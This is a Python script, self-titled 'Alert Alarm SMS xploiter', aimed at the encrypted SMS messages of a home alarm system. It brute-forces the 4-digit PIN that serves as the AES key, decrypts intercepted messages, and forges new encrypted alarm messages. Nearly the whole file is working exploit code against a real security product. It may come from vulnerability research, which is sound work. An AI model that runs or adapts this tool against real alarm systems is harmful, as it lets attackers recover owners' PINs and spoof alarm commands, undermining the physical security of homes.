#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import binascii
import logging
import sys

from argparse import ArgumentParser
from curses.ascii import isalpha
from Crypto.Cipher import AES

################################################################################
# Argument parser
################################################################################
def get_parser():
    """ Takes care of script argument parsing. """
    parser = ArgumentParser(description='Alert Alarm SMS xploiter')

    parser.add_argument('-b', '--bruteforce', required=False, action="store_true", \
    default=False, \
    help='Brute force, tries to find correct encryption key and pin code')

    parser.add_argument('-d', '--decrypt', required=False, action="store_true", \
    default=False, \
    help='Perform decryption')

    parser.add_argument('-e', '--encrypt', required=False, action="store_true", \
    default=False, \
    help='Perform encryption')

    parser.add_argument('-i', '--input', required=False, action="store", \
    default=False, \
    help='Raw message (encrypted or decrypted)')

    parser.add_argument('-o', '--output', required=False, action="store_true", \
    default=False, \
    help='File to store output')

    parser.add_argument('-p', '--pin', required=False, action="store", \
    default=False, \
    help='')

    parser.add_argument('-v', required=False, action="store_true", \
    default=False, \
    help='Output some verbose debugging info')

    return parser

def string_to_hex(s):
    pin = bytearray(s, 'utf-8')
    return binascii.hexlify(pin).decode()

def hex_to_bytearray(h):
     return binascii.unhexlify(h)

def bytearray_to_hex(b):
     return binascii.hexlify(b)

def print_sms_dict(sd):
    for k in sd:
        logging.debug("{}: {}".format(k, sd[k]))

def pretty_print_sms_dict(sd):
    logging.info("| sms_v | i | j | year | month | day | hour | minute | user_id |")
    logging.info("      {}   {}   {}     {}     {}    {}     {}       {}        {}".format(
        sd["version"],
        sd["i"],
        sd["j"],
        sd["year"],
        sd["month"],
        sd["day"],
        sd["hour"],
        sd["minute"],
        sd["userid"]))


def decoded_sms_to_dict(sms):
    if len(sms) != 16:
        logging.error("Wrong decoded length!")
        sys.exit(1)

    sms_dict = {}
    try:
        sms_dict["version"] = "{}".format(int(sms[0:1]))
        sms_dict["i"]       = "{}".format(int(sms[1:2]))
        sms_dict["j"]       = "{}".format(int(sms[2:3]))
        sms_dict["year"]    = "{:02d}".format(int(sms[3:5]))
        sms_dict["month"]   = "{}".format(hex(int(sms[5:6])))
        sms_dict["day"]     = "{:02d}".format(int(sms[6:8]))
        sms_dict["hour"]    = "{:02d}".format(int(sms[8:10]))
        sms_dict["minute"]  = "{:02d}".format(int(sms[10:12]))
        sms_dict["userid"]  = "{:02d}".format(int(sms[12:14]))
    except ValueError:
        logging.error("Found bogus data (sms: {}".format(sms))
        return None

    return sms_dict

def create_msg():
    version = 2
    i = 0
    j = 1
    year = 19
    month = 5
    day = 21
    hour = 9
    minute = 2
    userid = 1
    pad = "\x00\x00"
    msg = "{:1d}{:1d}{:1d}{:02d}{:1d}{:02d}{:02d}{:02d}{:02d}{}".format(
            version, i, j, year, month, day, hour, minute, userid, pad)
    logging.debug("Created msg({}): {}".format(len(msg), msg))

    return string_to_hex(msg)

def encrypt(key, msg, iv):
    logging.debug("(E)IV:  {}".format(iv))
    logging.debug("(E)Msg: {}".format(msg))
    logging.debug("(E)Key: {}".format(key))
    iv = hex_to_bytearray(iv)
    key = hex_to_bytearray(key)
    msg = hex_to_bytearray(msg)
    cipher_ctx = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher_ctx.encrypt(msg)
    logging.debug("ct: {}".format(bytearray_to_hex(ciphertext)))
    return ciphertext

def decrypt(key, msg, iv):
    logging.debug("(D)IV:  {}".format(iv))
    logging.debug("(D)Msg: {}".format(msg))
    logging.debug("(D)Key: {}".format(key))
    iv = hex_to_bytearray(iv)
    key = hex_to_bytearray(key)
    msg = hex_to_bytearray(msg)
    cipher_ctx = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher_ctx.decrypt(msg)
    return plaintext


def brute_force(msg, iv):
    logging.info("Running bruteforce ...")
    scores = {}
    for k in range(0, 10000):
        key = string_to_hex("{}{:04d}".format("0"*12, k))
        plaintext = decrypt(key, msg, iv)
        tmp_score = 0
        for i in range(0, len(plaintext)):
            if chr(plaintext[i]).isdigit():
                tmp_score += 10
            elif isalpha(plaintext[i]):
                tmp_score += 2
        scores[key] = tmp_score

    best_score = 0
    best_key = ""

    for k in scores:
        if scores[k] > best_score:
            best_score = scores[k]
            best_key = k

    logging.debug("Best key score: {}".format(best_score))
    pin = binascii.unhexlify(best_key[24:32])
    logging.info("key: {} gives pin: {}".format(best_key, int((pin))))


################################################################################
# Main function
################################################################################
def main(argv):
    logging.basicConfig(format='[%(levelname)s]: %(message)s', level=logging.DEBUG)
    parser = get_parser()

    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    if args.encrypt and args.decrypt:
        logging.error("Cannot use -e (--encrypt) and -d (--decrypt) at the same time");
        sys.exit(1)

    enc_operation = True;

    if args.encrypt:
        logging.info("Mode: encryption");

    if args.decrypt:
        logging.info("Mode: decryption");
        enc_operation = False;

    if len(args.input) != 64:
        logging.error("Not the expected length of an Alert Alarm SMS (64 bytes)")
        sys.exit(1)

    pin = None
    if args.pin:
        pin = args.pin

    iv = args.input[0:32]
    msg = args.input[32:64]
    logging.debug("IV:  {}".format(iv))
    logging.debug("Msg: {}".format(msg))

    if pin is not None:
        key_raw = "{}{}".format("0"*12, args.pin)
        key = string_to_hex(key_raw)
        logging.debug("Key: {} ({})".format(key, key_raw))
        if enc_operation:
            msg = create_msg()
            ciphertext = encrypt(key, msg, iv)
        else:
            plaintext = decrypt(key, msg, iv)
            pt_dict = decoded_sms_to_dict(plaintext)
            if pt_dict is not None:
                pretty_print_sms_dict(pt_dict)

    if args.bruteforce:
        # Try brute force
        brute_force(msg, iv)

if __name__ == "__main__":
    main(sys.argv)
